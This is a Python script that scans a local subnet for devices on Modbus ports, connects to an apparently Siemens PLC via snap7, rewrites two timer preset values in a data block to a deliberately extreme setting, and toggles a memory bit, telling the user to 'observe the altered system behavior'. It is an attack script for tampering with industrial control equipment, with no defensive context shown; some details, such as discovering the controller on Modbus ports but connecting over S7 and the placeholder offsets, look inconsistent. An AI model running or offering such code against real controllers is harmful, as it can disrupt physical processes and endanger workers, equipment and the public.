import snap7
import struct
import time
import socket  # Import the socket module

# Configuration
PLC_IP = None  # Will be discovered
RACK = 0
SLOT = 1
DATA_BLOCK_NUMBER = 1  # Assuming a single data block for simplicity.  Adjust as needed.
OFFSET_M_TOG = 1  # Byte offset in the DB for %M2 (BOOL)
OFFSET_TIMER0_PT = 12  # Example: Replace with actual offset of Timer0.PT (Preset Time) in DB. Timer0 is TP which has .PT as TIME (DWORD) and .IN and .Q as BOOL
OFFSET_TIMER1_PT = 16  # Example: Replace with actual offset of Timer1.PT (Preset Time) in DB. Timer1 is TON which has .PT as TIME (DWORD) and .IN and .Q as BOOL
NEW_TIMER_VALUE = 5  # New timer value in seconds (DWORD).  Setting to 5 seconds.  Extreme value to demonstrate impact.

def find_plc_ip():
    """
    Finds the PLC IP address by attempting to connect to common Modbus ports.
    This is a simplified approach and may not be reliable in all network configurations.
    """
    # Common Modbus ports
    possible_ports = [502, 20502]  # Add any other likely ports

    for port in possible_ports:
        # Iterate over a range of possible IP addresses in a class C network
        for i in range(1, 255):
            ip_address = f"192.168.9.{i}"
            try:
                # Create a socket and attempt a connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)  # Short timeout to avoid long delays
                sock.connect((ip_address, port))

                print(f"Successfully connected to {ip_address} on port {port}.")  # Indicate a successful connection
                sock.close()
                return ip_address  # Return the discovered IP

            except (socket.timeout, socket.error):
                # Connection failed, try the next IP
                pass
            finally:
                sock.close()

    return None  # If no IP is found


def connect_to_plc(ip_address, rack, slot):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    plc.set_timeout(1000) # Set Timeout in milliseconds
    try:
        plc.connect(ip_address, rack, slot)
        print(f"Successfully connected to PLC at {ip_address}.")
        return plc
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return None


def read_db(plc, db_number):
    """Reads the entire data block."""
    try:
        db_size = plc.get_db_size(db_number)
        data = plc.db_read(db_number, 0, db_size)
        return data
    except Exception as e:
        print(f"Error reading DB{db_number}: {e}")
        return None


def write_db(plc, db_number, offset, data):
    """Writes data to the specified offset in the data block."""
    try:
        plc.db_write(db_number, offset, data)
        print(f"Successfully wrote data to DB{db_number} at offset {offset}.")
    except Exception as e:
        print(f"Error writing to DB{db_number} at offset {offset}: {e}")
        return False
    return True


def modify_timer_value(plc, db_number, offset, new_value):
    """Modifies a timer preset value in the data block."""
    # Convert the new timer value (seconds) to milliseconds (DWORD)
    new_value_ms = new_value * 1000
    data = struct.pack(">I", new_value_ms)  # Pack as big-endian unsigned integer (DWORD)

    if write_db(plc, db_number, offset, data):
      print(f"Timer value set to {new_value} seconds.")
      return True
    else:
      print(f"Failed to modify timer")
      return False


def toggle_M_TOG(plc, db_number, offset):
    """Toggles the M_TOG memory bit in the data block."""
    # Read the current state of the byte containing the bit
    data = plc.db_read(db_number, offset, 1)
    current_byte = data[0]

    # Toggle the bit (M_TOG is %M2, which is the 2nd bit, or bit index 1)
    new_byte = current_byte ^ (1 << 1)  # XOR with a mask that has only the 2nd bit set

    # Write the modified byte back to the PLC
    data_to_write = bytes([new_byte])
    if write_db(plc, db_number, offset, data_to_write):
      print("M_TOG toggled successfully")
      return True
    else:
      print("Failed to toggle M_TOG")
      return False



def main():
    global PLC_IP
    # Find the PLC IP Address
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("Could not automatically find PLC IP address.  Please specify it manually.")
            return
    print(f"Using PLC IP Address: {PLC_IP}")


    plc = connect_to_plc(PLC_IP, RACK, SLOT)
    if not plc:
        return

    try:
        # 1. Modify Timer0 Preset Value (PT)
        if not modify_timer_value(plc, DATA_BLOCK_NUMBER, OFFSET_TIMER0_PT, NEW_TIMER_VALUE):
            print("Failed to modify Timer0.  Exiting.")
            return

        # 2. Modify Timer1 Preset Value (PT)
        if not modify_timer_value(plc, DATA_BLOCK_NUMBER, OFFSET_TIMER1_PT, NEW_TIMER_VALUE):
            print("Failed to modify Timer1.  Exiting.")
            return

        # 3. Toggle M_TOG
        if not toggle_M_TOG(plc, DATA_BLOCK_NUMBER, OFFSET_M_TOG):
            print("Failed to toggle M_TOG. Exiting.")
            return


        print("Parameter modification completed.  Observe the altered system behavior.")

    finally:
        plc.disconnect()
        print("Disconnected from PLC.")


if __name__ == "__main__":
    main()